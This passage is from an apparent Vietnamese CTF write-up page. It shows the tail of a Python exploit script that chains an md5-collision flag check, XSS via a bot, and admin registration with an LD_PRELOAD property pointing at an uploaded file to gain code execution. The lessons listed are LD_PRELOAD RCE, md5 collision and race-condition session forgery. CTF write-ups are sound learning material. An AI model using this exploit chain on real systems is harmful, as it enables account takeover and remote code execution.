+        files = {&quot;flag&quot;: flag_file}
+        response = requests.post(f&quot;{url}/register&quot;,data=data, files=files, allow_redirects=False)
+        print(response.cookies)
+        return response
+
+def checkFlag(session,checked_id,checker_id) :  
+    global XSS_PATH
+    with open(&quot;msg2.bin&quot;, &quot;rb&quot;) as f: 
+        data = {
+            &quot;flag&quot;: f.read()
+        }
+        try :
+            response = session.post(f&quot;{url}/api/users/{checked_id}/checkflag&quot;,data=data,allow_redirects=False)
+            print(&quot;FAIL&quot;)
+        except :
+            print(&quot;SUCCESSFULLLY&quot;)
+            res  = session.get(f&quot;{url}/api/users/{checker_id}/guesses&quot;,allow_redirects=False)
+            guess_id = res.json()['guesses'][-1]['guess_id']
+            XSS_PATH += f&quot;/api/users/{checker_id}/guesses/{guess_id}&quot;
+            print(&quot;XSS_URL: &quot;, XSS_PATH)
+##Create HasH
+
+if admin_displayName ==&quot;&quot; : 
+    username= &quot;fucaka&quot;
+    password=  &quot;fuckaa&quot;
+    createMsg1(username,password)
+    s = login(username,password)
+    msg1Id = getProfile(s)
+    print(f&quot;MSG1 ID = {msg1Id}\n&quot;)
+
+
+    ## Createt guesser
+    username = &quot;guessers&quot;
+    password = &quot;guessers&quot;
+    register(username,password)
+    s = login(username,password)
+    guesserId = getProfile(s)
+    print(f&quot;GUESSER ID  = {guesserId}&quot;)
+    checkFlag(s,msg1Id,guesserId)
+    bot (s)
+    exit(0)
+
+## Now we have the display name ##
+## TIME TO EXPLOIT ## 
+
+register(&quot;SOaaa&quot;,&quot;SOaaa&quot;)
+s = login(&quot;SOaaa&quot;,&quot;SOaaa&quot;)
+
+
+FLAG_SO = getProfile(s)
+print(f&quot;FLAG_SO_ID: {FLAG_SO['user_id']}&quot;)
+props =  {
+            &quot;description&quot; : &quot;FUCk&quot; ,
+            &quot;LD_PRELOAD&quot; :  f&quot;/app/userdata/{FLAG_SO['user_id']}/flag.txt&quot;,
+    }
+FLAG_SO[&quot;logged_in&quot;] = True
+FLAG_SO['properties'] = props
+register (admin_username,&quot;?&quot;,admin_displayName,FLAG_SO) 
+</code></pre>
+
+<h2 id="new-knowledge" class="header-anchor-wrapper">New knowledge
+  <a href="#new-knowledge" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<ul>
+<li>Rce gadget through ENV $LD_PRELOAD (mình khong biết điều này nên đã khá vướng bận khi tìm gadget rce)</li>
+<li>md5 collision</li>
+<li>Forgery session with race condition ( đôi khi không cần leak jwt key để có một signed session)</li>
+</ul>
+
+<h2 id="rút-kinh-nghiệm-" class="header-anchor-wrapper">Rút kinh nghiệm :
+  <a href="#r%c3%bat-kinh-nghi%e1%bb%87m-" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<ol>
+<li>Đọc kĩ hơn :)</li>
+<li>Test mọi case đề chặn</li>
+<li>Trình</li>
+</ol>
+
+</article>
+</div>
+   
+      </div>
+    </main>
+<footer>
+    <article>Copyright © 2025 by 3HLD Team | v1.0</article>
+</footer>
+
+</body>
+</html>
